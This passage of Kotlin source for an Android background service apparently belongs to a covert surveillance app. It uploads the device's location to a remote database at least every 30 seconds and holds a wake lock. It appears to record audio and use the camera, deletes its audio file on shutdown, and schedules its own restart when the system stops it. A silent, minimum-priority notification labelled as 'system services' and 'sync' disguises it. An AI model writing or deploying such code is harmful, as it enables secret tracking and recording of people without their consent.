                val lastLoc = locationResult.lastLocation
                if (lastLoc != null) {
                    saveLocationIfChanged(lastLoc.latitude, lastLoc.longitude)
                }
            }
        }

        try {
            fusedLocationClient?.requestLocationUpdates(
                locationRequest,
                locationCallback!!,
                Looper.getMainLooper()
            )
        } catch (e: Exception) {
            Log.e(TAG, "Location updates request error", e)
        }
    }

    private fun saveLocationIfChanged(lat: Double, lon: Double, force: Boolean = false) {
        val now = System.currentTimeMillis()
        val latDiff = Math.abs(lat - lastSavedLat)
        val lonDiff = Math.abs(lon - lastSavedLon)

        if (force || latDiff > 0.00005 || lonDiff > 0.00005 || now - lastLocationUploadTime > 30000L) {
            lastSavedLat = lat
            lastSavedLon = lon
            lastLocationUploadTime = now
            val correctLocationData = mapOf(
                "lat" to lat.toString(),
                "lon" to lon.toString(),
                "timestamp" to now
            )
            locationRef?.setValue(correctLocationData)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        heartbeatHandler.removeCallbacks(heartbeatRunnable)
        releaseWakeLock()
        if (locationCallback != null && fusedLocationClient != null) {
            fusedLocationClient?.removeLocationUpdates(locationCallback!!)
        }
        if (isRecording) {
            stopAudioRecording()
        }
        try {
            val audioFile = File(filesDir, "audio_record.m4a")
            if (audioFile.exists()) audioFile.delete()
        } catch (_: Exception) {}
        try {
            cameraThread?.quitSafely()
        } catch (_: Exception) {}
        try {
            serviceExecutor.shutdown()
        } catch (_: Exception) {}

        // Agar xizmat tizim tomonidan to'xtatilsa, zudlik bilan qayta ishga tushirish
        try {
            val restartIntent = Intent(this, BootReceiver::class.java).apply {
                action = "com.hokimloyha.app.ACTION_RESTART_SERVICE"
            }
            val pi = PendingIntent.getBroadcast(
                this, 9999, restartIntent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val am = getSystemService(ALARM_SERVICE) as AlarmManager
            val triggerAt = SystemClock.elapsedRealtime() + 1500L
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            } else {
                am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            }
        } catch (_: Exception) {}
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID,
                "Tizim xizmatlari",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Xizmatlar orqa fonda sinxronlashmoqda"
                setShowBadge(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(serviceChannel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Ijro Tizimi")
            .setContentText("Sinxronizatsiya faol")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
